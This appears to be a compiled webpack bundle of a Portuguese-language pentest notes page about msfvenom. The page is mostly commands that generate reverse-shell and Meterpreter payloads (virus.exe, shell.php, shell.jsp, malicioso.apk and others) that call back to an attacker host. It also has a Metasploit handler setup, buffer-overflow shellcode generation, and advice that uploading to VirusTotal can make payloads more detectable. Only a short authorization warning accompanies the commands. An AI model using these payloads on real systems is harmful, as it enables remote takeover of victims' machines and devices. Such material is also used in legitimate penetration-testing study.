"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[3623],{3905:(e,a,o)=>{o.d(a,{Zo:()=>d,kt:()=>v});var n=o(7294);function r(e,a,o){return a in e?Object.defineProperty(e,a,{value:o,enumerable:!0,configurable:!0,writable:!0}):e[a]=o,e}function t(e,a){var o=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);a&&(n=n.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),o.push.apply(o,n)}return o}function l(e){for(var a=1;a<arguments.length;a++){var o=null!=arguments[a]?arguments[a]:{};a%2?t(Object(o),!0).forEach((function(a){r(e,a,o[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(o)):t(Object(o)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(o,a))}))}return e}function s(e,a){if(null==e)return{};var o,n,r=function(e,a){if(null==e)return{};var o,n,r={},t=Object.keys(e);for(n=0;n<t.length;n++)o=t[n],a.indexOf(o)>=0||(r[o]=e[o]);return r}(e,a);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);for(n=0;n<t.length;n++)o=t[n],a.indexOf(o)>=0||Object.prototype.propertyIsEnumerable.call(e,o)&&(r[o]=e[o])}return r}var p=n.createContext({}),i=function(e){var a=n.useContext(p),o=a;return e&&(o="function"==typeof e?e(a):l(l({},a),e)),o},d=function(e){var a=i(e.components);return n.createElement(p.Provider,{value:a},e.children)},m="mdxType",c={inlineCode:"code",wrapper:function(e){var a=e.children;return n.createElement(n.Fragment,{},a)}},u=n.forwardRef((function(e,a){var o=e.components,r=e.mdxType,t=e.originalType,p=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),m=i(o),u=r,v=m["".concat(p,".").concat(u)]||m[u]||c[u]||t;return o?n.createElement(v,l(l({ref:a},d),{},{components:o})):n.createElement(v,l({ref:a},d))}));function v(e,a){var o=arguments,r=a&&a.mdxType;if("string"==typeof e||r){var t=o.length,l=new Array(t);l[0]=u;var s={};for(var p in a)hasOwnProperty.call(a,p)&&(s[p]=a[p]);s.originalType=e,s[m]="string"==typeof e?e:r,l[1]=s;for(var i=2;i<t;i++)l[i]=o[i];return n.createElement.apply(null,l)}return n.createElement.apply(null,o)}u.displayName="MDXCreateElement"},4871:(e,a,o)=>{o.r(a),o.d(a,{assets:()=>p,contentTitle:()=>l,default:()=>c,frontMatter:()=>t,metadata:()=>s,toc:()=>i});var n=o(7462),r=(o(7294),o(3905));const t={id:"msfvenom",title:"msfvenom"},l="MSFVENOM",s={unversionedId:"pentest/msfvenom",id:"pentest/msfvenom",title:"msfvenom",description:"O msfvenom \xe9 uma poderosa ferramenta utilizada para criar exploits e gerar",source:"@site/docs/pentest/msfvenom.mdx",sourceDirName:"pentest",slug:"/pentest/msfvenom",permalink:"/my-docs/docs/pentest/msfvenom",draft:!1,tags:[],version:"current",frontMatter:{id:"msfvenom",title:"msfvenom"},sidebar:"tutorialSidebar",previous:{title:"httpx",permalink:"/my-docs/docs/pentest/httpx"},next:{title:"nc (netcat)",permalink:"/my-docs/docs/pentest/nc"}},p={},i=[{value:"Aviso Importante",id:"aviso-importante",level:2},{value:"Testando Payloads",id:"testando-payloads",level:2},{value:"Listando Payloads Dispon\xedveis",id:"listando-payloads-dispon\xedveis",level:2},{value:"Gerando Payloads para Diferentes Sistemas",id:"gerando-payloads-para-diferentes-sistemas",level:2},{value:"Payload para Windows",id:"payload-para-windows",level:3},{value:"Payload para Linux",id:"payload-para-linux",level:3},{value:"Payload para Mac",id:"payload-para-mac",level:3},{value:"Payloads para Servidores WEB",id:"payloads-para-servidores-web",level:2},{value:"Payload PHP",id:"payload-php",level:3},{value:"Payload ASP",id:"payload-asp",level:3},{value:"Payload JSP",id:"payload-jsp",level:3},{value:"Payload WAR",id:"payload-war",level:3},{value:"Payloads Adicionais",id:"payloads-adicionais",level:2},{value:"Payload Python",id:"payload-python",level:3},{value:"Payload Bash",id:"payload-bash",level:3},{value:"Payload Perl",id:"payload-perl",level:3},{value:"Shellcode",id:"shellcode",level:2},{value:"Linux Based Shellcode",id:"linux-based-shellcode",level:3},{value:"Windows Based Shellcode",id:"windows-based-shellcode",level:3},{value:"Mac Based Shellcode",id:"mac-based-shellcode",level:3},{value:"Recebendo a Conex\xe3o do Alvo",id:"recebendo-a-conex\xe3o-do-alvo",level:2},{value:"Criando um Exploit para Windows para Buffer Overflow (BoF)",id:"criando-um-exploit-para-windows-para-buffer-overflow-bof",level:2},{value:"Gerando Payload Bin\xe1rio para Sistema Linux",id:"gerando-payload-bin\xe1rio-para-sistema-linux",level:2},{value:"Gerando Payload APK para Android",id:"gerando-payload-apk-para-android",level:2}],d={toc:i},m="wrapper";function c(e){let{components:a,...o}=e;return(0,r.kt)(m,(0,n.Z)({},d,o,{components:a,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"msfvenom"},"MSFVENOM"),(0,r.kt)("p",null,"O ",(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom")," \xe9 uma poderosa ferramenta utilizada para criar exploits e gerar\npayloads para diferentes sistemas operacionais e arquiteturas. \xc9 uma parte\nessencial do Metasploit Framework, uma plataforma de testes de penetra\xe7\xe3o de\nc\xf3digo aberto."),(0,r.kt)("h2",{id:"aviso-importante"},"Aviso Importante"),(0,r.kt)("p",null,"Ao usar o ",(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom")," para criar payloads maliciosos, \xe9 crucial garantir que voc\xea\ntenha autoriza\xe7\xe3o expl\xedcita para realizar tais testes em sistemas e redes. O uso\nindevido dessas t\xe9cnicas \xe9 ilegal e pode resultar em s\xe9rias consequ\xeancias\nlegais."),(0,r.kt)("h2",{id:"testando-payloads"},"Testando Payloads"),(0,r.kt)("p",null,"Antes de executar os payloads gerados, \xe9 altamente recomendado test\xe1-los em um\nambiente controlado. Uma maneira de fazer isso \xe9 enviando o arquivo para o site\n",(0,r.kt)("a",{parentName:"p",href:"https://www.virustotal.com"},"VirusTotal"),", por\xe9m, tenha cuidado, pois o envio\npara o VirusTotal pode atualizar a heur\xedstica de alguns antiv\xedrus, tornando os\npayloads mais detect\xe1veis."),(0,r.kt)("h2",{id:"listando-payloads-dispon\xedveis"},"Listando Payloads Dispon\xedveis"),(0,r.kt)("p",null,"Para verificar todos os payloads dispon\xedveis, execute o seguinte comando:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom --list payloads\n")),(0,r.kt)("h2",{id:"gerando-payloads-para-diferentes-sistemas"},"Gerando Payloads para Diferentes Sistemas"),(0,r.kt)("h3",{id:"payload-para-windows"},"Payload para Windows"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=192.168.0.100 \\\n    LPORT=443 \\\n    -f exe > virus.exe\n")),(0,r.kt)("h3",{id:"payload-para-linux"},"Payload para Linux"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f elf > shell.elf\n")),(0,r.kt)("h3",{id:"payload-para-mac"},"Payload para Mac"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p osx/x86/shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f macho > shell.macho\n")),(0,r.kt)("h2",{id:"payloads-para-servidores-web"},"Payloads para Servidores WEB"),(0,r.kt)("h3",{id:"payload-php"},"Payload PHP"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p php/meterpreter_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.php\n\ncat shell.php | pbcopy && \\\n    echo '<?php ' | tr -d '\\n' > shell.php && \\\n    pbpaste >> shell.php\n")),(0,r.kt)("admonition",{type:"info"},(0,r.kt)("p",{parentName:"admonition"},(0,r.kt)("inlineCode",{parentName:"p"},"pbcopy")," e ",(0,r.kt)("inlineCode",{parentName:"p"},"pbpaste")," precisam ser instalados atrav\xe9s do seguinte comando:"),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sudo apt-get install xclip\n"))),(0,r.kt)("h3",{id:"payload-asp"},"Payload ASP"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f asp > shell.asp\n")),(0,r.kt)("h3",{id:"payload-jsp"},"Payload JSP"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p java/jsp_shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.jsp\n")),(0,r.kt)("h3",{id:"payload-war"},"Payload WAR"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p java/jsp_shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f war > shell.war\n")),(0,r.kt)("h2",{id:"payloads-adicionais"},"Payloads Adicionais"),(0,r.kt)("h3",{id:"payload-python"},"Payload Python"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p cmd/unix/reverse_python \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.py\n")),(0,r.kt)("h3",{id:"payload-bash"},"Payload Bash"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p cmd/unix/reverse_bash \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.sh\n")),(0,r.kt)("h3",{id:"payload-perl"},"Payload Perl"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p cmd/unix/reverse_perl \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.pl\n")),(0,r.kt)("h2",{id:"shellcode"},"Shellcode"),(0,r.kt)("p",null,"Para todos os c\xf3digos de shell, consulte ",(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom --list format")," para obter\ninforma\xe7\xf5es sobre par\xe2metros v\xe1lidos. O ",(0,r.kt)("inlineCode",{parentName:"p"},"msfvenom")," produzir\xe1 um c\xf3digo que pode\nser recortado e colado nessa linguagem para suas explora\xe7\xf5es."),(0,r.kt)("h3",{id:"linux-based-shellcode"},"Linux Based Shellcode"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n")),(0,r.kt)("h3",{id:"windows-based-shellcode"},"Windows Based Shellcode"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n")),(0,r.kt)("h3",{id:"mac-based-shellcode"},"Mac Based Shellcode"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p osx/x86/shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n")),(0,r.kt)("h2",{id:"recebendo-a-conex\xe3o-do-alvo"},"Recebendo a Conex\xe3o do Alvo"),(0,r.kt)("p",null,"Para receber a conex\xe3o do alvo, ser\xe1 necess\xe1rio que o Metasploit esteja em\nexecu\xe7\xe3o. Para configurar o Metasploit para a conex\xe3o reversa, siga os seguintes\npassos:"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Execute o Metasploit:")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfconsole\n")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"No console do Metasploit, configure o exploit e as op\xe7\xf5es necess\xe1rias:")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-msf"},"msf > use exploit/multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LPORT 443\nmsf exploit(handler) > set LHOST 192.168.0.100\nmsf exploit(handler) > exploit\n")),(0,r.kt)("h2",{id:"criando-um-exploit-para-windows-para-buffer-overflow-bof"},"Criando um Exploit para Windows para Buffer Overflow (BoF)"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'msfvenom -p windows/shell_reverse_tcp \\\n    LHOST=192.168.0.100 \\\n    LPORT=443 \\\n    -b "\\x00\\x0a\\x0d\\x20" \\\n    EXITFUNC=thread \\\n    -f python\n')),(0,r.kt)("p",null,"Explica\xe7\xe3o dos par\xe2metros:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"-p windows/shell_reverse_tcp"),": Tipo do exploit."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"LHOST"),": IP de conex\xe3o reversa."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"LPORT"),": Porta de conex\xe3o reversa."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},'-b "\\x00\\x0a\\x0d\\x20"'),": Bad caracteres ou caracteres inv\xe1lidos."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"EXITFUNC=thread"),": Evita que a aplica\xe7\xe3o morra depois do exploit ser fechado.")),(0,r.kt)("h2",{id:"gerando-payload-bin\xe1rio-para-sistema-linux"},"Gerando Payload Bin\xe1rio para Sistema Linux"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    lport=433 \\\n    lhost=192.168.0.111 \\\n    -f elf > malicioso\n")),(0,r.kt)("p",null,"Esse tipo de payload \xe9 usado quando voc\xea j\xe1 tem acesso \xe0 shell no dispositivo e\nnecessita usar o meterpreter para auxiliar na p\xf3s-explora\xe7\xe3o."),(0,r.kt)("h2",{id:"gerando-payload-apk-para-android"},"Gerando Payload APK para Android"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"msfvenom -p android/meterpreter/reverse_tcp \\\n    lport=433 \\\n    lhost=192.168.0.111 \\\n    R > malicioso.apk\n")),(0,r.kt)("admonition",{type:"info"},(0,r.kt)("p",{parentName:"admonition"},"O par\xe2metro ",(0,r.kt)("inlineCode",{parentName:"p"},"R")," indica que o arquivo ser\xe1 salvo em modo RAW. Essa abordagem \xe9\nutilizada quando voc\xea j\xe1 tem uma shell no dispositivo Android e necessita usar o\nmeterpreter para auxiliar na p\xf3s-explora\xe7\xe3o.")))}c.isMDXComponent=!0}}]);